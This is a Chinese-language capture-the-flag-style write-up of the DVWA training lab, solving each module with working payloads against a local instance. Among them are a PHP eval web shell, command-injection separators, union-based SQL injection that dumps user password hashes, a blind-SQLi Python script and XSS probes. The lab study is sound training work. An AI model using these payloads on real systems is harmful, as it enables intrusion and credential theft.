---
title: DVWA WriteUp
date: 2026-07-15
tags: [靶场,writeup]
---

# DVWA WriteUp



### Brute Force

通过burpsuite内嵌浏览器打开dvwa靶场，开启拦截。

随机输入账号密码并提交。

![image-20260712225657929](./img/image-20260712225657929.png)

回到bp，将拦截到的请求右键发送到攻击器。

来到攻击器，将username和password对应上传的参数“**admin**”和“**password**”添加payload，再将攻击模式改成**集群炸弹模式**。

![image-20260712230015553](./img/image-20260712230015553.png)

payload选择提前创建好的字典，开始攻击。

![image-20260712230155141](./img/image-20260712230155141.png)

长度不同的这个响应就是正确账密。

![image-20260712230325825](./img/image-20260712230325825.png)

验证正确。

---

### Command Injection

是一个ping功能

![image-20260724102138042](./img/image-20260724102138042.png)

命令注入，直接尝试连接符，跟上我们其他的命令

```
127.0.0.1 | ls
```

![image-20260724102647117](./img/image-20260724102647117.png)

注入成功

#### 命令连接符

**a && b** ：代表首先执行前者命令a再执行后命令b，但是前提条件是命令a执行正确才会执行命令b，在a执行失败的情况下不会执行b命令。所以又被称为短路运算符。
（前面的命令执行成功后，它后面的命令才被执行）

**a & b**：代表首先执行命令a再执行命令b，如果a执行失败，还是会继续执行命令b。也就是说命令b的执行不会受到命令a的干扰。
（表示简单的拼接，A命令语句和B命令语句没有制约关系）

**a || b**：代表首先执行a命令再执行b命令，如果a命令执行成功，就不会执行b命令，相反，如果a命令执行不成功，就会执行b命令。
（前面的命令执行失败，它后面的命令才被执行）

**a | b**：代表首先执行a命令，再执行b命令，不管a命令成功与否，都会去执行b命令。
（当第一条命令失败时，它仍然会执行第二条命令，表示A命令语句的输出，作为B命令语句的输入执行。）

**a ; b**：用于将多个命令连接在一起，按顺序执行每个命令，无论前一个命令的执行结果如何。

原文链接：https://blog.csdn.net/weixin_43847838/article/details/111602811

---

### CSRF

这是个更改登录密码的页面，新密码->确认密码->修改->修改成功

![image-20260724110417084](./img/image-20260724110417084.png)

能够注意到url栏是

```
http://localhost/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
```

**password_new**和**password_conf**的参数内容`password`就是我输入的新密码

说明我们输入的密码会在url进行传参执行

那么修改url参数直接访问

```
http://localhost/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#
```

![image-20260724111150662](./img/image-20260724111150662.png)

修改成功

---

### File Inclusion

有三个链接可以点击

![image-20260724195333185](./img/image-20260724195333185.png)

分别点击，发现url栏参数跟着变化

![image-20260724195843926](./img/image-20260724195843926.png)

尝试修改参数

![image-20260724195956344](./img/image-20260724195956344.png)

远程文件包含

![image-20260724200109498](./img/image-20260724200109498.png)

本地文件包含

![image-20260724201337449](./img/image-20260724201337449.png)

---

### File Upload

直接上传一句话木马123.php，内容是

```
<?php @eval($_POST['123']);?>
```

![image-20260725110726087](./img/image-20260725110726087.png)

打开文件验证是否成功

![image-20260725110919592](./img/image-20260725110919592.png)

能打开说明上传成功，用蚁剑连接

![image-20260725111116101](./img/image-20260725111116101.png)

---

### Insecure CAPTCHA

CAPTCHA（全自动区分计算机和人类的图灵测试）的核心目的不是验证“你是谁”，而是验证**“你是不是人”**。它的实现机制主要依赖人类与机器在感知和认知上的差异。

直接修改密码

![image-20260725115246024](./img/image-20260725115246024.png)

显示验证码不正确

查看源码

```
<?phpif( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check CAPTCHA from 3rd party    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key'],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";        $hide_form = false;        return;    }    else {        // CAPTCHA was correct. Do both new passwords match?        if( $pass_new == $pass_conf ) {            // Show next stage for the user            echo "                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>                <form action=\"#\" method=\"POST\">                    <input type=\"hidden\" name=\"step\" value=\"2\" />                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />                    <input type=\"submit\" name=\"Change\" value=\"Change\" />                </form>";        }        else {            // Both new passwords do not match.            $html     .= "<pre>Both passwords must match.</pre>";            $hide_form = false;        }    }}if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check to see if both password match    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );        // Feedback for the end user        echo "<pre>Password Changed.</pre>";    }    else {        // Issue with the passwords matching        echo "<pre>Passwords did not match.</pre>";        $hide_form = false;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?>
```

发现后端通过检查change和step来判断验证是否通过

用bp抓包，Repeater中修改step=2

![image-20260725150154007](./img/image-20260725150154007.png)

---

### SQL Injection

尝试输入`1'`，可以看出是单引号字符型注入

![image-20260725175009046](./img/image-20260725175009046.png)

再输入`1'-- -`，正常显示

![image-20260725175155590](./img/image-20260725175155590.png)

```
1' order by 1-- -
```

到3时报错，说明表的字段数是2

![image-20260725175556776](./img/image-20260725175556776.png)

直接构造

```
-1' union select 1,group_concat(schema_name) from information_schema.schemata-- -
```

![image-20260725181818331](./img/image-20260725181818331.png)

```
-1' union select 1,group_concat(table_name) from information_schema.tables -- -
```

![image-20260725182244340](./img/image-20260725182244340.png)

```
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' -- -
```

![image-20260725182414181](./img/image-20260725182414181.png)

```
-1' union select 1,group_concat(user,0x3a,password) from users-- -
```

![image-20260725182612422](./img/image-20260725182612422.png)

---

### SQL Injection (Blind)

输入1，提示数据库中存在

![image-20260725220348703](./img/image-20260725220348703.png)

输入999，提示不存在

![image-20260725220948021](./img/image-20260725220948021.png)

用python构建自动化脚本，通过是否返回exists判断

```python
import requests

url = "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
cookies = {"PHPSESSID": "your_session_id", "security": "low"}

db_name = ""
for i in range(1, 20):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
        payload = f"1' and substr(database(),{i},1)='{c}'-- -"
        r = requests.get(url, params={"id": payload, "Submit": "Submit"}, cookies=cookies)
        if "exists" in r.text:
            db_name += c
            print(f"[+] {db_name}")
            break
    else:
        break

print(f"[*] Database: {db_name}")
```

---

### Weak Session IDs

每点击generate按钮后，这个网页会生成一个叫做dvwaSession的新cookie

直接bp抓包

![image-20260725221926254](./img/image-20260725221926254.png)

发现Session ID就是+1递增的

直接记录下当前cookie值

```
dvwaSession=1; PHPSESSID=gulkjk1253f3hqrt5b5qqj4tg6; security=low
```

清空浏览器中dvwa的缓存

重新访问该页面

跳转到登陆页面

![image-20260725224645795](./img/image-20260725224645795.png)

hacker bar填写url和cookie，excute

![image-20260725224804140](./img/image-20260725224804140.png)

不输入账号密码情况下成功登录

---

### XSS(DOM)

可以选择输入，发现可能是url传参default

![image-20260726152948347](./img/image-20260726152948347.png)

尝试`<script>alert(1)</script>`

```
http://dvwa:8898/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

![image-20260726153158241](./img/image-20260726153158241.png)

存在XSS注入

---

### XSS(Reflected)

输入1，发现可能是url传参name

![image-20260726153605711](./img/image-20260726153605711.png)

```
http://dvwa:8898/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

![image-20260726153748406](./img/image-20260726153748406.png)

---

### XSS(Stored)

尝试输入1，1；发现内容被记录下来

![image-20260726155444352](./img/image-20260726155444352.png)

尝试1，`<script>alert(1)</script>`

![image-20260726155713834](./img/image-20260726155713834.png)

脚本成功运行

刷新页面

![image-20260726155809831](./img/image-20260726155809831.png)

再次弹窗，证明是存储型XSS

---

### CSP  Bypass

提示查看CSP白名单

直接bp抓包

![image-20260726161733083](./img/image-20260726161733083.png)

注意到回包中Content-Security-Policy字段

访问其中一条网址，是个可粘贴文本网站，粘贴`alert(1)`

![image-20260726165323257](./img/image-20260726165323257.png)

dvwa中输入刚刚上传脚本可下载链接

![image-20260726165211621](./img/image-20260726165211621.png)

![image-20260726165228962](./img/image-20260726165228962.png)

---

### JavaScript Attacks

提示输入success通关

![image-20260726171924868](./img/image-20260726171924868.png)

提示token错误

![image-20260726171950751](./img/image-20260726171950751.png)

bp抓包

![image-20260726172023098](./img/image-20260726172023098.png)

![image-20260726172103157](./img/image-20260726172103157.png)

发现用的都是一个token值

查看页面源码，找到token生成部分

![image-20260726173351936](./img/image-20260726173351936.png)

分析发现

页面加载时，`generate_token()` 函数会立即运行。它会把输入框 `phrase`，默认值是即`ChangeMe` 先做 ROT13 编码，再计算其 MD5 值。计算出的 MD5 值会自动填入隐藏域 `token` 中。

提交时始终是ChangeMe对应的token，和你输入的success，导致不正确。

那么就先输入success，再打开控制台执行一遍`generate_token()`，重新生成success对应的token，提交。

![image-20260726174158756](./img/image-20260726174158756.png)

![image-20260726174221449](./img/image-20260726174221449.png)

---

### Authorisation Bypass

这个页面只有`admin`账户能够访问并操作，让我们使用`gordonb / abc123`尝试绕过

记住当前url路径

![image-20260728094420515](./img/image-20260728094420515.png)

退出登录，用普通账户`gordonb / abc123`重新登录

导航栏没有**Authorisation Bypass**了

![image-20260728094102069](./img/image-20260728094102069.png)

url加上刚刚保存的目录`/authbypass/`

成功绕过

![image-20260728094028771](./img/image-20260728094028771.png)

---

### Open HTTP Redirect

点击两个链接，发现url有传参点

![image-20260728122526735](./img/image-20260728122526735.png)

定位源码，发现重定向

```
<a href="source/low.php?redirect=info.php?id=1">Quote 1</a>
```

![image-20260728122343616](./img/image-20260728122343616.png)

构造url

```
source/low.php?redirect=http://www.baidu.com
```

![image-20260728122725876](./img/image-20260728122725876.png)

成功重定向指定网站

---

### Cryptography

将密文解密成明文密码，填入password栏

![image-20260728202909922](./img/image-20260728202909922.png)

---

